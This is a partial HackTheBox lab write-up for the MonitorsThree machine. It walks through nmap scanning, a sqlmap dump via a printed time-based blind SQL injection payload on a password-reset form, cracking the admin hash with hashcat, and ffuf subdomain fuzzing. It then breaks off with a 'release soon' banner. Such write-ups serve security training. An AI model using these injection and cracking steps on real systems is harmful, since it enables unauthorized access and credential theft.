---
title: "Hackthebox: Monitors-Three [Machine] [Season 6]"
author: c3l1kd
categories: [Hackthebox]
tags:
  [Privilege Escalation, Reverse Shell, Nmap, SQLi, Exploitation, (CVE-2024-25641)]
render_with_liquid: false
img_path: /images/hackthebox_monitorthree/
image:
  path: room_image.webp
---

**MonitorsThree** is a Medium HackTheBox machine where we start by enumerating a web server finding an SQLi that leads to data leak for then gaining a reverse shell by exploiting a vulnerability in cacti `(CVE-2024-25641)` , user pivoting by cracking a user’s hash and then exploit a Duplicati web app running locally to gain root access.

## Initial Enumeration

### Nmap Scan

```console
┌──(kali㉿kali)-[~/Desktop/HackTheBox/MonitorsThree]
└─$ nmap -sC -sV 10.129.200.79 -oN monitors.out -T4    
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-26 16:30 CET
Nmap scan report for 10.129.200.79
Host is up (0.084s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE    SERVICE VERSION
22/tcp   open     ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 86:f8:7d:6f:42:91:bb:89:72:91:af:72:f3:01:ff:5b (ECDSA)
|_  256 50:f9:ed:8e:73:64:9e:aa:f6:08:95:14:f0:a6:0d:57 (ED25519)
80/tcp   open     http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://monitorsthree.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
8084/tcp filtered websnp
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.77 seconds
```

We have identified `2` ports using nmap,

- **22/SSH** - (`open`)
- **80/HTTP** - (`open`)

## Web Server

Having a redirection when accessing the web server, we added a new entry into our `/etc/hosts`.

```console
127.0.0.1       localhost
127.0.1.1       voldemort
10.129.200.79   monitorsthree.htb

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```

Taking a look at `http://monitorsthree.htb` we get a web app for a networking solutions firm. Looking around we found a login page at `http://monitorsthree.htb/login.ph`p with a reset password feature, trying some default creds such as admin:admin and root:root won’t be able to help us much so we decided to run an SQLMap on the form and see if it’s vulnerable to SQLi. Capturing a request using Burpsuite we gave it to SQLMap to try some SQLi payloads it didn’t work as intended but trying the same technique on `/forgot_password`.php it worked, the form was vulnerable to SQLi!

> ⚠️As it’s a time-based blind it will take some time to run and retrieve useful information.

![/etc/hosts](01.png){: width="1200" height="800" }

## Sqlmap 

```console
┌──(kali㉿kali)-[~/Desktop/HackTheBox/MonitorsThree]
└─$ sqlmap -r forgot.req -dbms=mysql --dump --dbs --batch                                           
        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.8.5#stable}
|_ -| . [,]     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 16:38:35 /2024-08-26/

[16:38:35] [INFO] parsing HTTP request from 'forgot.req'
[16:38:35] [INFO] testing connection to the target URL
got a 302 redirect to 'http://monitorsthree.htb/forgot_password.php'. Do you want to follow? [Y/n] Y
redirect is a result of a POST request. Do you want to resend original POST data to a new location? [Y/n] Y
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: username (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=admin' AND (SELECT 2766 FROM (SELECT(SLEEP(5)))QhIU) AND 'GfJL'='GfJL
---
[16:38:36] [INFO] testing MySQL
[16:38:36] [INFO] confirming MySQL
[16:38:36] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Nginx 1.18.0
back-end DBMS: MySQL >= 5.0.0 (MariaDB fork)
[16:38:36] [INFO] fetching database names
[16:38:36] [INFO] fetching number of databases
[16:38:36] [INFO] resumed: 2
[16:38:36] [INFO] resumed: information_schema
[16:38:36] [INFO] resumed: monitorsthree_db
available databases [2]:
[*] information_schema
[*] monitorsthree_db
```

We found a database called `monitorsthree_db`, digging deeper into it using SQLMap we were able to retrieve `4` hashes.

```console
┌──(str4ngerx㉿voldemort)-[~/Desktop/HackTheBox/MonitorsThree]
└─$ cat hashes | sed 's/|//g' | awk '{print $1,":",$2}' | sed 's/ //g' > hashes      
                                                                                                      
┌──(kali㉿kali)-[~/Desktop/HackTheBox/MonitorsThree]
└─$ cat hashes
admin:[REDACTED]
mwatson:[REDACTED]
janderson:[REDACTED]
dthompson:[REDACTED]
```

## Exploitation

### Reverse Shell

Cracking the hashes using hashcat we were able to get the admin’s plain-text password.

```console
┌──(kali㉿kali)-[~/Desktop/HackTheBox/MonitorsThree]
└─$ hashcat hashes /usr/share/wordlists/rockyou.txt --username -m 0 --show
admin:31a181c8[REDACTED]:[REDACTED]
```

Using the credentials we got to connect we didn’t find anything useful for us to get a reverse shell.

So we decided to run a subdomain enumeration to fuzz the web server we found 1 subdomain, cacti.

## FUFF

```console
┌──(kali㉿kali)-[~/Desktop/HackTheBox/MonitorsThree]
└─$ ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -u http://monitorsthree.htb -H "Host: FUZZ.monitorsthree.htb" -fs 13560

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://monitorsthree.htb
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt
 :: Header           : Host: FUZZ.monitorsthree.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 13560
________________________________________________

cacti                   [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 112ms]
:: Progress: [19966/19966] :: Job [1/1] :: 286 req/sec :: Duration: [0:00:53] :: Errors: 0 ::
```

Adding that to our `/etc/hosts` and having a look at it we get another form, trying the credentials we got earlier we were able to connect.

![/etc/hosts](02.png){: width="1200" height="800" }



<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">

  <style>
    .note-containers {
      max-width: 600px;
      width: 100%;
      padding: 20px;
      background-color: #28a745;
      color: white;
      border-radius: 15px;
      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
      text-align: center;
      margin: 0 auto; /* Ensures the second container is centered */
    }

    .note-containers p {
      font-size: 1.2rem;
      line-height: 1.6;
    }

    .note-containers strong {
      font-weight: bold;
      font-size: 1.3rem;
      color: #ffdd57;
    }
  </style>
</head>
<body>
  <div class="note-containers">
    <p>
      This writeup will be released <strong>soon!</strong>
    </p>
  </div>
</body>
</html>
